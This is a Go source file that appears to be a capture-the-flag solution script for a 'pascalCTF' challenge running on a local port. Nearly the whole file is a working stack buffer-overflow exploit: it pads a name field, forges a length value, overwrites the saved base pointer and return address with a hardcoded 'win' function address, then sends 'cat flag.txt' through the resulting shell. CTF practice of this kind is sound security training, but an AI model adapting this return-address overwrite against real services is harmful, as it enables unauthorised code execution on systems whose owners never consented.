package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"regexp"
	"strings"
	"time"
)

func checkErr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func readAll(conn net.Conn, pattern string) []string {
	err := conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	checkErr(err)

	var buf bytes.Buffer
	bufTmp := make([]byte, 1024)

	defer func() {
		fmt.Printf("%s", buf.String())
	}()

	for {
		n, err := conn.Read(bufTmp)
		if err != nil {
			if pattern != "" {
				log.Fatalf("Cannot read: %q", pattern)
			}
			break
		}

		buf.Write(bufTmp[:n])

		if pattern != "" {
			re := regexp.MustCompile(pattern)
			res := re.FindStringSubmatch(buf.String())

			if len(res) > 0 {
				return res[1:]
			}
		}
	}

	return nil
}

func write(conn net.Conn, input *bytes.Buffer) {
	fmt.Printf("%s", input.String())

	_, err := io.Copy(conn, input)
	checkErr(err)

	if input.Len() != 0 {
		log.Fatalf("Cannot write all: %v", input.Len())
	}
}

func main() {
	conn, err := net.Dial("tcp", "127.0.0.1:1338")
	checkErr(err)
	defer conn.Close()

	var input bytes.Buffer

	_ = readAll(conn, "To continue insert your name .* :")

	name := strings.Repeat("a", 76)
	nameBufferLen := uint32(76 + 4 + 8 + 8) // sizeof(name) + sizeof(nameBufferLen) + sizeof(padding) + sizeof(winPointer)
	input.WriteString(name)
	_ = binary.Write(&input, binary.LittleEndian, nameBufferLen)
	input.WriteString(" ")
	write(conn, &input)

	_ = readAll(conn, "Market menu:")

	input.WriteString("69\n")
	write(conn, &input)

	_ = readAll(conn, `I forgot it`)

	padding := uint64(0)                     // saved RBP
	winPointer := uint64(0x0000000000402F65) // return address

	input.WriteString(name)
	_ = binary.Write(&input, binary.LittleEndian, nameBufferLen)
	_ = binary.Write(&input, binary.LittleEndian, padding)
	_ = binary.Write(&input, binary.LittleEndian, winPointer)
	input.WriteString("\n")
	write(conn, &input)

	_ = readAll(conn, "")

	input.WriteString("cat flag.txt\n")
	write(conn, &input)

	_ = readAll(conn, "pascalCTF{.*}")
}
